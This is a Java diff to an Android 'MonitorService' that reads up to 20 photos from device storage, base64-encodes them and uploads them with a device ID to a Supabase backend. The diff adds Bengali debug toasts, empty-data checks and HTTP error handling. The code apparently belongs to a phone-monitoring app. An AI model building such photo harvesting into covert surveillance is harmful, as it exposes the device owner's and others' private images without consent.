@@ -96,6 +96,14 @@ public class MonitorService extends Service {
             photoDebugInfo = "";
             JSONArray photoList = getPhotos();
 
+            String firstSize = "N/A";
+            if (photoList.length() > 0) {
+                try {
+                    firstSize = photoList.getJSONObject(0).getString("data").length() + " বাইট";
+                } catch (Exception ignored) {
+                }
+            }
+
             String permission = Build.VERSION.SDK_INT >= 33
                     ? android.Manifest.permission.READ_MEDIA_IMAGES
                     : android.Manifest.permission.READ_EXTERNAL_STORAGE;
@@ -103,12 +111,24 @@ public class MonitorService extends Service {
                     == PackageManager.PERMISSION_GRANTED;
             String debugMsg = "পারমিশন: " + (granted ? "আছে" : "নেই")
                     + " | পাওয়া: " + photoList.length() + "টি"
+                    + " | প্রথম ছবির ডেটা: " + firstSize
                     + (photoDebugInfo.isEmpty() ? "" : " | " + photoDebugInfo);
             mainHandler.post(() -> Toast.makeText(MonitorService.this, debugMsg, Toast.LENGTH_LONG).show());
             Log.d("MonitorService", debugMsg);
 
+            int uploadFailures = 0;
             for (int i = 0; i < photoList.length(); i++) {
-                uploadPhoto(deviceId, photoList.getJSONObject(i));
+                try {
+                    uploadPhoto(deviceId, photoList.getJSONObject(i));
+                } catch (Exception e) {
+                    uploadFailures++;
+                    Log.e("uploadPhoto", e.toString());
+                }
+            }
+            if (uploadFailures > 0) {
+                final int failures = uploadFailures;
+                mainHandler.post(() -> Toast.makeText(MonitorService.this,
+                        "ছবি আপলোড ব্যর্থ: " + failures + "টি", Toast.LENGTH_LONG).show());
             }
 
             Log.d("MonitorService", "সিঙ্ক সম্পন্ন: " + deviceId);
@@ -204,6 +224,7 @@ public class MonitorService extends Service {
             photoDebugInfo = "কার্সারে রো: " + totalRows;
 
             int readErrors = 0;
+            int emptyData = 0;
             int count = 0;
             while (cursor.moveToNext() && count < 20) {
                 long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
@@ -213,6 +234,10 @@ public class MonitorService extends Service {
                 try (InputStream is = getContentResolver().openInputStream(uri)) {
                     if (is != null) {
                         byte[] imageData = readAllBytes(is);
+                        if (imageData.length == 0) {
+                            emptyData++;
+                            continue;
+                        }
                         String base64 = Base64.getEncoder().encodeToString(imageData);
                         JSONObject photo = new JSONObject();
                         photo.put("name", name);
@@ -229,6 +254,9 @@ public class MonitorService extends Service {
             }
             if (readErrors > 0) {
                 photoDebugInfo += ", পড়তে ব্যর্থ: " + readErrors;
+            }
+            if (emptyData > 0) {
+                photoDebugInfo += ", খালি ডেটা: " + emptyData;
             }
         } catch (Exception e) {
             photoDebugInfo = "কুয়েরি এক্সেপশন: " + e.getMessage();
@@ -257,12 +285,25 @@ public class MonitorService extends Service {
         conn.setRequestProperty("apikey", Config.SUPABASE_KEY);
         conn.setRequestProperty("Authorization", "Bearer " + Config.SUPABASE_KEY);
         conn.setDoOutput(true);
+        conn.setChunkedStreamingMode(0);
 
         OutputStream os = conn.getOutputStream();
-        os.write(jsonData.getBytes());
+        os.write(jsonData.getBytes("UTF-8"));
+        os.flush();
         os.close();
 
-        conn.getResponseCode();
+        int code = conn.getResponseCode();
+        if (code < 200 || code >= 300) {
+            String errorBody = "";
+            try (InputStream es = conn.getErrorStream()) {
+                if (es != null) {
+                    errorBody = new String(readAllBytes(es), "UTF-8");
+                }
+            } catch (Exception ignored) {
+            }
+            conn.disconnect();
+            throw new Exception("HTTP " + code + ": " + errorBody);
+        }
         conn.disconnect();
     }
 
